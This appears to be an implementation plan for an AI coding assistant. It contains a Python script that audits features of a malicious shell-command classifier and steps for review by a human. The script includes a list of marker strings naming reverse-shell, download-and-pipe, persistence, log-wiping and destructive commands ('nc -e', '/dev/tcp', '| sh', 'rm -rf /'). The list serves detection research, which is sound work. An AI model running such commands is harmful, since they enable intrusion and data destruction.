# Dataset 2's RETIRED P1 selection markers (docs/KNOWN_ISSUES.md). Labels are
# provenance-based now; correlation with these is a flag for Ch4, not a ban.
_RETIRED_MARKERS = ("wget", "curl", "chmod +x", "| sh", "/dev/tcp", "nc -e",
                    "bash -i", "authorized_keys", "crontab", "history -c",
                    "> /var/log", "rm -rf /")

# Family grouping for the report; must exactly cover FEATURE_NAMES.
FAMILIES = {
    "shape/size": (
        "len_chars", "len_tokens", "token_entropy", "char_entropy",
        "mean_token_len", "max_token_len"),
    "structure/chaining": (
        "n_pipes", "n_redirect_out", "n_redirect_in", "has_stderr_merge",
        "n_semicolons", "n_and_or", "n_backticks_subshell", "n_quotes",
        "n_parens", "n_braces"),
    "network/delivery": (
        "has_ipv4", "n_ipv4", "has_private_ip", "has_public_ip", "has_url",
        "has_dev_tcp", "n_ports"),
    "binary families": (
        "has_fetch_bin", "has_shell_bin", "has_interp_bin", "has_lotl_bin",
        "has_enum_bin", "n_enum_bins", "has_privesc_bin", "has_evasion_tok"),
    "A: head/args": (
        "head_is_fetch", "head_is_shell", "head_is_interp", "head_is_lotl",
        "head_is_enum", "head_is_privesc", "n_flags", "has_long_flag",
        "n_assign_prefix"),
    "B: exec micro-structure": (
        "has_pipe_to_shell", "has_fetch_exec_chain", "has_decode_exec",
        "has_ifs_expansion", "has_heredoc", "has_dev_null",
        "has_shell_flag_i", "has_exec_flag"),
    "C: paths/filesystem": (
        "n_abs_paths", "has_hidden_path", "has_staging_dir", "has_home_ref",
        "n_cred_paths", "n_proc_paths", "n_log_paths", "n_sensitive_paths"),
    "D: obfuscation": (
        "has_base64_blob", "b64_run_len", "has_hex_escape", "has_eval",
        "nonprintable_ratio", "digit_ratio", "special_ratio",
        "n_var_assignments", "n_var_expansions", "has_quote_splice",
        "n_backslash", "subshell_depth"),
}
_FAMILY_OF = {f: fam for fam, fs in FAMILIES.items() for f in fs}
assert set(_FAMILY_OF) == set(FEATURE_NAMES), (
    "FAMILIES drifted from FEATURE_NAMES: "
    f"{set(_FAMILY_OF) ^ set(FEATURE_NAMES)}")


def is_binary(name: str) -> bool:
    return name.startswith(("has_", "head_is_"))


def cliffs_delta(mal: np.ndarray, ben: np.ndarray) -> tuple:
    """(delta, p, auc). delta = 2U/(n1 n2) - 1 (== rank-biserial ==
    Cliff's delta); auc = U/(n1 n2). Positive delta => larger for attacks."""
    n1, n2 = len(mal), len(ben)
    if n1 == 0 or n2 == 0:
        return 0.0, 1.0, 0.5
    U, p = mannwhitneyu(mal, ben, alternative="two-sided")
    auc = float(U) / (n1 * n2)
    return 2.0 * auc - 1.0, float(p), auc


def odds_ratio(mal: np.ndarray, ben: np.ndarray) -> float:
    """Haldane-Anscombe corrected OR of (value > 0) for attack vs benign."""
    a = float((mal > 0).sum()) + 0.5   # attack, positive
    b = float((mal == 0).sum()) + 0.5  # attack, negative
    c = float((ben > 0).sum()) + 0.5   # benign, positive
    d = float((ben == 0).sum()) + 0.5  # benign, negative
    return (a / b) / (c / d)


def _selftest():
    rng = np.random.default_rng(SEED)
    hi, lo = rng.normal(2, 1, 500), rng.normal(0, 1, 500)
    d, p, auc = cliffs_delta(hi, lo)
    assert d > 0.5 and p < 1e-10 and auc > 0.75, "cliffs_delta broken"
    d0, _, auc0 = cliffs_delta(lo, lo.copy())
    assert abs(d0) < 1e-9 and abs(auc0 - 0.5) < 1e-9
    assert odds_ratio(np.ones(10), np.zeros(10)) > OR_HI
    assert odds_ratio(np.zeros(10), np.ones(10)) < OR_LO


class _UnionFind:
    def __init__(self, items):
        self.parent = {x: x for x in items}

    def find(self, x):
        while self.parent[x] != x:
            self.parent[x] = self.parent[self.parent[x]]
            x = self.parent[x]
        return x

    def union(self, a, b):
        ra, rb = self.find(a), self.find(b)
        if ra != rb:
            self.parent[ra] = rb


def main():
    _selftest()
    RESULTS.mkdir(exist_ok=True)
    REPORT.mkdir(exist_ok=True)
    datasets = ingestion.available_datasets()

    per_ds = {}        # ds -> dict(X, y, src, marker, prevalence)
    for ds in datasets:
        train, _ = ingestion.load(ds)
        X = featurize(train["command"])
        y = train["label"].to_numpy()
        low = train["command"].str.lower()
        marker = low.apply(
            lambda s: int(any(m in s for m in _RETIRED_MARKERS))).to_numpy()
        per_ds[ds] = dict(X=X, y=y, src=train["source"].to_numpy(),
                          marker=marker, prevalence=float(y.mean()))
        print(f"[audit] {ds}: {len(X)} train rows, "
              f"prevalence {y.mean():.3f}, "
              f"retired-marker rate {marker.mean():.3f}")

    # ---- per-feature signal + shortcut stats --------------------------------
    per_feature = {f: {"family": _FAMILY_OF[f], "binary": is_binary(f),
                       "per_dataset": {}} for f in FEATURE_NAMES}
    for ds, blob in per_ds.items():
        X, y, src, marker = blob["X"], blob["y"], blob["src"], blob["marker"]
        for f in FEATURE_NAMES:
            x = X[f].to_numpy(dtype=float)
            mal, ben = x[y == 1], x[y == 0]
            dead = bool(x.var() == 0)
            if dead:
                delta, p, auc = 0.0, 1.0, 0.5
            else:
                delta, p, auc = cliffs_delta(mal, ben)
            if per_feature[f]["binary"]:
                orr = odds_ratio(mal, ben)
                effect_type, effect = "odds_ratio", orr
                passes = (p < ALPHA) and (orr >= OR_HI or orr <= OR_LO)
            else:
                effect_type, effect = "cliffs_delta", delta
                passes = (p < ALPHA) and (abs(delta) >= DELTA_MIN)
            solo_f1 = float(f1_score(y, (x > 0).astype(int),
                                     zero_division=0))
            pos_attack = (y == 1) & (x > 0)
            if pos_attack.any():
                conc = float(pd.Series(src[pos_attack])
                             .value_counts(normalize=True).iloc[0])
            else:
                conc = 0.0
            if dead or marker.var() == 0:
                rho = 0.0
            else:
                rho = spearmanr(x, marker).correlation
                rho = 0.0 if np.isnan(rho) else float(rho)
            per_feature[f]["per_dataset"][ds] = {
                "mean_mal": float(np.mean(mal)) if len(mal) else 0.0,
                "mean_ben": float(np.mean(ben)) if len(ben) else 0.0,
                "median_mal": float(np.median(mal)) if len(mal) else 0.0,
                "median_ben": float(np.median(ben)) if len(ben) else 0.0,
                "mwu_p": float(p),
                "effect_type": effect_type,
                "effect": float(effect),
                "auc": float(auc),
                "solo_rule_f1": solo_f1,
                "source_concentration": conc,
                "retired_marker_rho": rho,
                "passes_gate": bool(passes and not dead),
                "dead": dead,
            }

    # ---- redundancy clusters (edges pooled across datasets) -----------------
    uf = _UnionFind(FEATURE_NAMES)
    edges = []
    for ds, blob in per_ds.items():
        Xf = blob["X"].astype(float)
        live = [f for f in FEATURE_NAMES if Xf[f].var() > 0]
        # pandas .corr always returns a matrix (scipy's spearmanr collapses
        # to a scalar for 2 columns, which would break after heavy pruning)
        rho_df = Xf[live].corr(method="spearman")
        for i in range(len(live)):
            for j in range(i + 1, len(live)):
                r = rho_df.iloc[i, j]
                if np.isfinite(r) and abs(r) > RHO_MAX:
                    uf.union(live[i], live[j])
                    edges.append((live[i], live[j], ds, round(float(r), 3)))
    groups = {}
    for f in FEATURE_NAMES:
        groups.setdefault(uf.find(f), []).append(f)
    clusters = sorted((sorted(g) for g in groups.values() if len(g) > 1),
                      key=lambda g: g[0])

    def _sep_score(f):  # mean distance from chance across datasets
        return float(np.mean([abs(d["auc"] - 0.5)
                              for d in per_feature[f]["per_dataset"].values()]))

    cluster_of, rep_of = {}, {}
    for idx, grp in enumerate(clusters):
        rep = max(grp, key=_sep_score)
        for f in grp:
            cluster_of[f] = idx
            rep_of[f] = rep

    # ---- flags + proposed verdicts ------------------------------------------
    for f in FEATURE_NAMES:
        info = per_feature[f]
        dss = info["per_dataset"]
        info["passes_gate_any"] = any(d["passes_gate"] for d in dss.values())
        info["cluster"] = cluster_of.get(f)
        info["is_representative"] = rep_of.get(f) == f if f in rep_of else None
        flags = []
        for ds, d in dss.items():
            if d["dead"]:
                flags.append(f"dead-on-{ds}")
            if (d["source_concentration"] > CONC_FLAG
                    and d["solo_rule_f1"] > SOLO_F1_FLAG):
                flags.append(f"P8-source-fingerprint-{ds}")
            if abs(d["retired_marker_rho"]) > MARKER_RHO_FLAG:
                flags.append(f"retired-marker-echo-{ds}")
        info["flags"] = flags
        if not info["passes_gate_any"]:
            verdict = "KILL (fails the agreed signal gate on every dataset)"
        elif f in rep_of and rep_of[f] != f:
            verdict = f"KILL (redundant: |rho|>{RHO_MAX} cluster, keep {rep_of[f]})"
        elif any(fl.startswith("P8-source-fingerprint") for fl in flags):
            verdict = "DISCUSS (source-fingerprint shortcut risk -- Ch4 exhibit)"
        elif any(fl.startswith("retired-marker-echo") for fl in flags):
            verdict = "KEEP (flag: echoes retired P1 marker -- note in Ch4)"
        else:
            verdict = "KEEP"
        info["proposed_verdict"] = verdict

    ipv4_f1 = {ds: per_feature["has_ipv4"]["per_dataset"][ds]["solo_rule_f1"]
               for ds in datasets}
    out = {
        "gate": {"alpha": ALPHA, "delta_min": DELTA_MIN, "or_hi": OR_HI,
                 "or_lo": OR_LO, "rho_max": RHO_MAX,
                 "conc_flag": CONC_FLAG, "solo_f1_flag": SOLO_F1_FLAG,
                 "marker_rho_flag": MARKER_RHO_FLAG},
        "datasets": {ds: {"n_train": int(len(per_ds[ds]["X"])),
                          "prevalence": per_ds[ds]["prevalence"],
                          "do_nothing_f1_floor":
                              2 * per_ds[ds]["prevalence"]
                              / (1 + per_ds[ds]["prevalence"]),
                          "retired_marker_rate":
                              float(per_ds[ds]["marker"].mean())}
                     for ds in datasets},
        "p8_ipv4_solo_f1": ipv4_f1,
        "retired_marker_prevalence": {
            ds: float(per_ds[ds]["marker"].mean()) for ds in datasets},
        "clusters": clusters,
        "cluster_edges": edges,
        "per_feature": per_feature,
    }
    (RESULTS / "ch3_feature_audit.json").write_text(
        json.dumps(out, indent=1, sort_keys=False))
    print(f"[audit] wrote results/ch3_feature_audit.json "
          f"({len(FEATURE_NAMES)} features x {len(datasets)} datasets)")
    print(f"[audit] P8 check -- has_ipv4 solo-rule F1: "
          + ", ".join(f"{ds}={v:.3f}" for ds, v in ipv4_f1.items())
          + "  (KNOWN_ISSUES P8 full-data value: 0.938 on dataset1)")

    _write_markdown(out, datasets)
    n_keep = sum(v["proposed_verdict"].startswith("KEEP")
                 for v in per_feature.values())
    n_kill = sum(v["proposed_verdict"].startswith("KILL")
                 for v in per_feature.values())
    n_disc = len(per_feature) - n_keep - n_kill
    print(f"[audit] proposed: {n_keep} KEEP / {n_kill} KILL / "
          f"{n_disc} DISCUSS -> joint review next "
          f"(report/ch3_feature_decisions.md)")


def _fmt_effect(d):
    if d["effect_type"] == "odds_ratio":
        return f"OR {d['effect']:.2f}"
    return f"d {d['effect']:+.2f}"


def _write_markdown(out, datasets):
    pf = out["per_feature"]
    lines = [
        "# Ch3 -- Feature audit & KEEP/REDEFINE/KILL decisions (Noam)",
        "",
        "> Evidence generated by `analysis/ch3_feature_audit.py` on TRAIN "
        "splits only. PROPOSED verdicts are the script's suggestions; the "
        "**final verdict** column is decided jointly (course AI policy) and "
        "filled in during review. Full numbers: "
        "`results/ch3_feature_audit.json`.",
        "",
        "## Setup",
        "",
        f"- Survival gate: p < {out['gate']['alpha']} AND "
        f"(|Cliff's d| >= {out['gate']['delta_min']} or OR >= "
        f"{out['gate']['or_hi']} / <= {out['gate']['or_lo']:.2f}) "
        "on >= 1 dataset.",
        f"- Redundancy: Spearman |rho| > {out['gate']['rho_max']}, one "
        "representative kept per cluster.",
    ]
    for ds in datasets:
        d = out["datasets"][ds]
        lines.append(
            f"- `{ds}`: {d['n_train']} train rows, prevalence "
            f"{d['prevalence']:.3f} (do-nothing F1 floor "
            f"{d['do_nothing_f1_floor']:.3f}), retired-P1-marker rate "
            f"{d['retired_marker_rate']:.3f}.")
    lines += [
        "",
        "## P8 headline (testbed-shortcut probe)",
        "",
        "Solo rule \"predict attack iff literal IPv4 present\" scores: "
        + ", ".join(f"**{v:.3f}** on `{ds}`"
                    for ds, v in out["p8_ipv4_solo_f1"].items())
        + ". KNOWN_ISSUES P8 measured 0.938 on full dataset1 -- any feature "
        "with solo-rule F1 in that range is a shortcut suspect, not a "
        "detector (Ch4 exhibit A).",
        "",
        "## Redundancy clusters (|rho| > 0.9)",
        "",
    ]
    if out["clusters"]:
        for i, grp in enumerate(out["clusters"]):
            rep = next(f for f in grp
                       if pf[f]["is_representative"])
            lines.append(f"- cluster {i}: " +
                         ", ".join(f"`{f}`" for f in grp) +
                         f" -> keep `{rep}`")
    else:
        lines.append("- none")
    lines += ["", "## Per-feature evidence and verdicts", ""]
    hdr_ds = " | ".join(f"{ds}: effect / p / AUC / soloF1" for ds in datasets)
    for fam, feats in FAMILIES.items():
        lines += [f"### {fam}", "",
                  f"| feature | {hdr_ds} | flags | PROPOSED | FINAL |",
                  "|" + "---|" * (len(datasets) + 4)]
        for f in feats:
            cells = []
            for ds in datasets:
                d = pf[f]["per_dataset"][ds]
                cells.append(f"{_fmt_effect(d)} / {d['mwu_p']:.1e} / "
                             f"{d['auc']:.2f} / {d['solo_rule_f1']:.2f}")
            flags = ", ".join(pf[f]["flags"]) or "--"
            lines.append(f"| `{f}` | " + " | ".join(cells) +
                         f" | {flags} | {pf[f]['proposed_verdict']} "
                         "| PENDING |")
        lines.append("")
    lines += [
        "## Hand-off",
        "",
        "- Final verdicts pending joint review (Noam calls each; this line "
        "is replaced when done).",
        "- After the final set lands: Ben re-runs Ch4 ranking, holdouts, "
        "sensitivity and figures (results/* regenerate).",
        "- `report/ch4_ranking_findings.md` references feature names from an "
        "older iteration (`shell_bins`, `redirect_count`, `path_proc`) -- "
        "stale, regenerate after merge.",
    ]
    (REPORT / "ch3_feature_decisions.md").write_text("\n".join(lines))
    print("[audit] wrote report/ch3_feature_decisions.md")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Syntax/self-test check without touching data**

Run: `python -c "import ast; ast.parse(open('analysis/ch3_feature_audit.py').read()); print('parse ok')"`
Expected: `parse ok`.

- [ ] **Step 3: Commit**

```bash
git add analysis/ch3_feature_audit.py
git commit -m "feat: add ch3 feature audit (signal, shortcut probes, redundancy clusters)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 4: Run the audit, generate evidence with PROPOSED verdicts

**Files:**
- Generated: `results/ch3_feature_audit.json`, `report/ch3_feature_decisions.md`

**Interfaces:**
- Consumes: Task 3's script; Task 2's `featurize`.
- Produces: committed evidence files that Task 5's joint review reads.

- [ ] **Step 1: Run the audit**

Run: `python analysis/ch3_feature_audit.py`
Expected: `_selftest()` passes silently; per-dataset row counts print; ends with `[audit] proposed: N KEEP / M KILL / K DISCUSS`. Runtime ~1–3 minutes (featurize on ~25k rows + a 68×68 Spearman per dataset).

- [ ] **Step 2: Sanity-check the evidence (do not skip)**

Check, by reading the printed output and `report/ch3_feature_decisions.md`:
1. `has_ipv4` solo-rule F1 on dataset1 is in the ~0.90–0.95 range (train-split version of KNOWN_ISSUES P8's 0.938) and carries the `P8-source-fingerprint-dataset1` flag (its concentration should implicate the QuasarNix source).
2. `has_fetch_bin` and `has_pipe_to_shell` correlate with the retired-marker probe on dataset2 (the markers *contain* `wget`/`curl`/`| sh`) — they should be flagged `retired-marker-echo-dataset2`, with verdict KEEP+flag, not KILL.
3. At least one redundancy cluster exists (`has_ipv4`/`n_ipv4` and `has_enum_bin`/`n_enum_bins` are near-duplicates by construction).
4. No feature is `dead` on both datasets except possibly `nonprintable_ratio` / `has_ifs_expansion` (rare tokens; if dead, that's evidence for the verdict session, not a bug).

If any check fails, debug before committing (most likely suspects: a regex in `features.py`, or the `x > 0` solo-rule on a feature whose benign minimum isn't 0).

- [ ] **Step 3: Commit the evidence**

```bash
git add results/ch3_feature_audit.json report/ch3_feature_decisions.md
git commit -m "chore: generate ch3 feature audit evidence with proposed verdicts

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 5: JOINT VERDICT CHECKPOINT (human gate — Noam decides)

**Files:**
- Modify: `src/features.py` (prune KILLed features; apply any REDEFINEs)
- Modify: `report/ch3_feature_decisions.md` (final verdict column; regenerated then hand-annotated)
- Regenerated: `results/ch3_feature_audit.json`
- Possibly modify: `tests/test_pipeline.py::test_featurize_behaviors` (only if a feature it asserts on is KILLed — delete just that assert line)

**Interfaces:**
- Consumes: Task 4's evidence; Noam's decisions.
- Produces: final `FEATURE_NAMES` (target ≈ 35–45 entries), finalized decisions doc.

**This task is a conversation, not a batch job. STOP and present; do not decide for Noam.**

- [ ] **Step 1: Present evidence family-by-family**

For each of the 8 families, present in chat: the per-feature table (effect/p/AUC/solo-F1 per dataset, flags), the script's proposed verdict, and a one-line recommendation with the trade-off in plain terms (per Noam's preference: explain what keeping/killing buys, recommend a default, let him confirm or adjust). Batch per family — 8 exchanges, not 68.

- [ ] **Step 2: Record final verdicts**

Collect Noam's verdict per feature (accept proposal / override, with his reason when overriding — the reasons go verbatim into the decisions doc; graders read the AI log for exactly this).

- [ ] **Step 3: Apply the verdicts to `src/features.py`**

- KILL: delete the entry from `FEATURE_NAMES` and its line in the `_features_for_one` dict (and any now-unused vocab/regex/helper — the file must not keep dead code).
- REDEFINE: apply the agreed new definition in place, and update its rationale comment.
- Update the `assert len(FEATURE_NAMES) == len(set(FEATURE_NAMES)) == 68` count to the new total.
- Update `FAMILIES` in `analysis/ch3_feature_audit.py` to match (the coverage assert will fail loudly if forgotten).

- [ ] **Step 4: Re-run tests, fix behavior test if needed**

Run: `python tests/test_pipeline.py`
Expected: PASS. If `test_featurize_behaviors` references a KILLed feature, delete only that assert line (the test documents surviving behavior).

- [ ] **Step 5: Regenerate the audit on the final set**

Run: `python analysis/ch3_feature_audit.py`
Expected: clean run; remaining features keep their verdict-worthy stats; no |ρ| > 0.9 cluster should survive with both members kept unless the decisions doc documents why.

- [ ] **Step 6: Finalize the decisions doc**

Edit `report/ch3_feature_decisions.md`: replace each `PENDING` with the final verdict; where Noam overrode the proposal, add his one-line reason; replace the "Final verdicts pending joint review" hand-off line with: `- Verdicts finalized jointly (Noam + Claude), 2026-08-08. Final feature count: <N>.`

- [ ] **Step 7: Commit**

```bash
git add src/features.py analysis/ch3_feature_audit.py tests/test_pipeline.py results/ch3_feature_audit.json report/ch3_feature_decisions.md
git commit -m "feat: apply joint feature verdicts -- final Ch3 feature set

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 6: Acceptance run + hand-off to Ben

**Files:**
- Read-only verification + the hand-off already embedded in `report/ch3_feature_decisions.md`.

**Interfaces:**
- Consumes: everything above.
- Produces: green acceptance evidence; Ben's re-run notice.

- [ ] **Step 1: Full guardrail suite**

Run: `python tests/test_pipeline.py`
Expected: `ALL PIPELINE GUARDRAIL TESTS PASSED` (existing assertions untouched — verify with `git diff 9b58ddb -- tests/test_pipeline.py` showing only appended functions and `_all()` additions).

- [ ] **Step 2: End-to-end holdout (spec acceptance criterion)**

Run: `python main.py holdout --model random_forest --dataset dataset1`
Expected: completes and prints holdout metrics. Note the F1 in chat for comparison against Ben's `results/holdout_random_forest_dataset1.json` (his number was computed on the old features — a delta is expected and is Ch4 material, not a failure).

- [ ] **Step 3: Verify acceptance criteria checklist**

- Every final `FEATURE_NAMES` entry has a verdict + evidence in `results/ch3_feature_audit.json` (spot-check the JSON keys against `FEATURE_NAMES`).
- No undocumented |ρ| > 0.9 pair survives (audit output section "Redundancy clusters").
- The hand-off section in `report/ch3_feature_decisions.md` tells Ben to re-run Ch4 ranking, holdouts, sensitivity, figures, and flags the stale `report/ch4_ranking_findings.md`.

- [ ] **Step 4: Final commit (if anything changed) and summary**

```bash
git add -A
git commit -m "docs: acceptance run for featurize() redesign; downstream re-run hand-off for Ben

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

Then summarize in chat for Noam: final feature count, notable kills/keeps, the P8/marker findings headed for Ch4, and the message to send Ben (re-run list + stale-file flag).
